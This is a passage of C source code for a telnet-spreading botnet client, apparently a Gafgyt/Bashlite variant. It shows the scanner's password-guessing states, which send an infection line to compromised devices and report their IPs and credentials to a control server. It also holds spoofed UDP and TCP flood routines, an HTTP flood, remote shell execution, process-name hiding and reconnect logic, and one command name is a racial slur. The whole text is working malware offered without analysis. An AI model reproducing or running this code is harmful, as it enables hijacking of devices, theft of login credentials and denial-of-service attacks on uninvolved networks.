                                                if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
                                                else fds[i].state = 7;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                continue;
                                        } else {
                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 8 < time(NULL)) //was if(fds[i].totalTimeout + 8 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 5:
                                {
                                        if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 6;
                                }
                                break;

                        case 6:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
                                                if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                                else fds[i].state = 7;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                continue;
                                        } else {
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 30 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

			case 7:
				{
					if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 8;
				}
				break;
			
			case 8:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
                    
					if(send(fds[i].fd, infectline, strlen(infectline), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
                    sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
					
					if(fds[i].totalTimeout + 8 < time(NULL))
					{
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
				}
				break;
			}
		}
	}
}

int socket_connect(char *host, in_port_t port)
{
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}


void sendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < power; i++)
	{
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UserAgents[(rand() % 36)]);
		if (fork())
		{
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void sendSTD(unsigned char *ip, int port, int secs) {

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
			char *dawgs = makestring();
            send(iSTD_Sock, dawgs, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                close(iSTD_Sock);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
	

}
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                    	//sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
                        sockprintf(mainCommSock, "Failed setting raw headers mode.");
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);

                        if(i == pollRegister)
                        {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                sockprintf(mainCommSock, "Failed opening raw socket.");
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                sockprintf(mainCommSock, "Failed setting raw headers mode.");
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                                sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void processCmd(int argc, unsigned char *argv[])
{
	int x;
        if(!strcmp(argv[0], "PING"))
        {
                sockprintf(mainCommSock, "PONG!");
                return;
        }

        if(!strcmp(argv[0], "GETLOCALIP"))
        {
                sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
                return;
        }

        if(!strcmp(argv[0], "SCANNER"))
        {
                if(argc != 2)
                {
                        sockprintf(mainCommSock, "SCANNER ON | OFF");
                        return;
                }

                if(!strcmp(argv[1], "OFF"))
                {
                        if(scanPid == 0) return;
                        kill(scanPid, 9);
						printf("SCANNER STOPPED!\n");
                        scanPid = 0;
                }

                if(!strcmp(argv[1], "ON"))
                {
                        if(scanPid != 0) return;
                        uint32_t parent;
                        parent = fork();
						printf("SCANNER STARTED!\n");
                        if (parent > 0) { scanPid = parent; return;}
                        else if(parent == -1) return;

                        StartTheLelz();
                        _exit(0);
                           }
        }


        if(!strcmp(argv[0], "UDP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
                        _exit(0);
                }
        }

        if (!strcmp(argv[0], "HTTP"))
	{
		if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
		if (listFork()) return;
		sockprintf(mainCommSock, "HTTP %s Flooding %s:%d for %d seconds", argv[1], argv[2], atoi(argv[3]), atoi(argv[5]));
		sendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
		exit(0);
	}
        if(!strcmp(argv[0], "STD"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                        
                        return;
            }
			
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			
			if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendSTD(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendSTD(ip, port, time);
                        _exit(0);
                }
			
		}

        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        //sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }

	if(!strcmp(argv[0], "KILLATTK"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }

                if(killed > 0)
                {
                        //sockprintf(mainCommSock, "Killed %d.", killed);
                } else {
                        //sockprintf(mainCommSock, "None Killed.");
                }
        }

        if(!strcmp(argv[0], "BROKENIGGA"))
        {
                exit(0);
        }
}

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } //if da sock initialized then close dat
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = 23;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock == -1) return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
        if(err == -1) return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);
        if(err == -1) return 0;

        ourIP.s_addr = name.sin_addr.s_addr;

        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if(strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while(*pos != '\t') pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if(*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}

char *getBuild()
{
	#ifdef MIPS_BUILD
	return "MIPS";
	#elif MIPSEL_BUILD
	return "MIPSEL";
	#elif X86_BUILD
	return "X86";
	#elif ARM_BUILD
	return "ARM";
	#elif PPC_BUILD
	return "POWERPC";
	#else
	return "DANKv1";
	#endif
}

int main(int argc, unsigned char *argv[])
{
        char *mynameis = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
	printf("BUILD %s\n", getBuild());
	strncpy(argv[0],"",strlen(argv[0]));
    	argv[0] = "";
    	prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
	srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;

        getOurIP();

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                                        //zprintf("fork failed\n");
                        }
        } else {
                        //zprintf("fork failed\n");
        }

        setsid();
        chdir("/");

        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }

		sockprintf(mainCommSock, "BUILD %s", getBuild());

                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        if(strstr(commBuf, "PING") == commBuf)
                        {
                                sockprintf(mainCommSock, "PONG");
                                continue;
                        }

                        if(strstr(commBuf, "DUP") == commBuf) exit(0);

                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                if(strcmp(command, "SH") == 0)
                                {
                                        unsigned char buf[1024];
                                        int command;
                                        if (listFork()) continue;
                                        memset(buf, 0, 1024);
                                        szprintf(buf, "%s 2>&1", message);
                                        command = fdpopen(buf, "r");
                                        while(fdgets(buf, 1024, command) != NULL)
                                        {
                                                trim(buf);
//                                                sockprintf(mainCommSock, "%s", buf);
                                                memset(buf, 0, 1024);
                                                sleep(1);
                                        }
                                        fdpclose(command);
                                        exit(0);
                                }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                     }
               printf("Link closed by server.\n");
	}

	return 0;

}



	